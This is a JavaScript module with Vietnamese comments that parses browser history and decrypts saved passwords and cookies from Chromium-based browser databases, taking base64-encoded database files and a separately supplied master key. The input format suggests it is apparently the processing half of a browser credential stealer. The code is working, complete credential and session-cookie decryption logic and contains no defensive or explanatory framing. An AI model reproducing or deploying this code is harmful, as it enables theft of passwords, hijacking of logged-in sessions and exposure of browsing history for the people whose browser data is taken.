// --- Module: Decryption & SQLite Processing ---
const crypto = require("crypto");
const initSqlJs = require('sql.js');

let SQL = null;

// Khởi tạo SQL.js
function initSQL() {
    return initSqlJs().then((S) => {
        SQL = S;
        console.log("[SQL] SQL.js initialized successfully");
        return SQL;
    }).catch(err => {
        console.error("⛔ [Init Error] Lỗi load SQL.js:", err);
        throw err;
    });
}

// Getter cho SQL instance
function getSQL() {
    return SQL;
}

// Hàm parse browser history từ SQLite DB (Chromium-based)
function parseBrowserHistory(historyDbB64, isFirefox = false, limit = 500) {
    if (!SQL) {
        console.log("SQL.js not ready yet.");
        return [];
    }

    let db = null;
    const results = [];
    try {
        const dbBuffer = Buffer.from(historyDbB64, 'base64');
        db = new SQL.Database(dbBuffer);

        let query;
        if (isFirefox) {
            // Firefox uses places.sqlite
            query = `SELECT url, title, visit_count, last_visit_date FROM moz_places 
                     WHERE url NOT LIKE 'place:%' 
                     ORDER BY last_visit_date DESC LIMIT ${limit}`;
        } else {
            // Chromium-based browsers
            query = `SELECT url, title, visit_count, last_visit_time FROM urls 
                     ORDER BY last_visit_time DESC LIMIT ${limit}`;
        }

        const stmt = db.prepare(query);
        while (stmt.step()) {
            const row = stmt.getAsObject();
            
            // Convert timestamp
            let visitTime;
            if (isFirefox) {
                // Firefox: microseconds since epoch
                visitTime = row.last_visit_date ? new Date(row.last_visit_date / 1000).toISOString() : null;
            } else {
                // Chromium: microseconds since Jan 1, 1601
                const chromiumEpoch = 11644473600000000n; // Microseconds
                const timestamp = BigInt(row.last_visit_time || 0);
                if (timestamp > 0) {
                    visitTime = new Date(Number((timestamp - chromiumEpoch) / 1000n)).toISOString();
                } else {
                    visitTime = null;
                }
            }

            results.push({
                url: row.url,
                title: row.title || "",
                visit_count: row.visit_count || 0,
                last_visit: visitTime
            });
        }
        stmt.free();
        return results;
    } catch (e) {
        console.log("Parse History Error:", e.message);
        return [];
    } finally {
        if (db) db.close();
    }
}

// --- DECRYPTION HELPERS ---
function decryptPasswords(masterKeyB64, dbFileB64) {
    // 1. Kiểm tra thư viện
    if (!SQL) { console.log("   [SQL] Lib not ready"); return []; }
    if (!dbFileB64) return [];

    try {
        const masterKey = Buffer.from(masterKeyB64, 'base64');
        const rawBuffer = Buffer.from(dbFileB64, 'base64');
        
        // 2. Ép kiểu sang Uint8Array (Bắt buộc với sql.js)
        const u8Array = new Uint8Array(rawBuffer);

        const db = new SQL.Database(u8Array); 

        const stmt = db.prepare("SELECT origin_url, username_value, password_value FROM logins");
        const results = [];

        while (stmt.step()) {
            const row = stmt.getAsObject();
            if (!row.password_value) continue;
            try {
                const buffer = Buffer.from(row.password_value);
                const prefix = buffer.slice(0, 3).toString('utf8');
                
                // Giải mã v10/v11 (AES-GCM)
                if (prefix === 'v10' || prefix === 'v11') {
                    const iv = buffer.slice(3, 15);
                    const ciphertext = buffer.slice(15, buffer.length - 16);
                    const tag = buffer.slice(-16);
                    
                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                    decipher.setAuthTag(tag);
                    const clear = decipher.update(ciphertext) + decipher.final('utf8');
                    
                    if (clear) results.push({ url: row.origin_url, user: row.username_value, pass: clear });
                }
            } catch(e) {}
        }
        stmt.free();
        db.close();
        return results;
    } catch (e) {
        console.error(`   [CRASH FIX] Lỗi chi tiết: ${e.message}`);
        return [];
    }
}

function decryptCookies(masterKeyB64, dbFileB64) {
    if (!SQL) return [];

    let db = null;
    const results = [];
    try {
        const masterKey = Buffer.from(masterKeyB64, 'base64');
        const dbBuffer = Buffer.from(dbFileB64, 'base64');

        db = new SQL.Database(dbBuffer);

        // Query lấy Cookies
        const stmt = db.prepare("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies");

        while(stmt.step()) {
            const row = stmt.getAsObject();
            if (!row.encrypted_value) continue;

            try {
                const buffer = Buffer.from(row.encrypted_value);
                const prefix = buffer.slice(0, 3).toString('utf8');
                let clearText;

                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
                    const iv = buffer.slice(3, 15);
                    const ciphertext = buffer.slice(15, buffer.length - 16);
                    const tag = buffer.slice(-16);

                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                    decipher.setAuthTag(tag);
                    clearText = decipher.update(ciphertext) + decipher.final('utf8');
                }

                if (clearText) {
                    results.push({
                        domain: row.host_key, name: row.name, value: clearText,
                        path: row.path, secure: !!row.is_secure,
                        expirationDate: (row.expires_utc / 1000000) - 11644473600
                    });
                }
            } catch(e) {}
        }
        stmt.free();
        return results;
    } catch (e) { return []; } 
    finally {
        if (db) db.close();
    }
}

module.exports = {
    initSQL,
    getSQL,
    parseBrowserHistory,
    decryptPasswords,
    decryptCookies
};
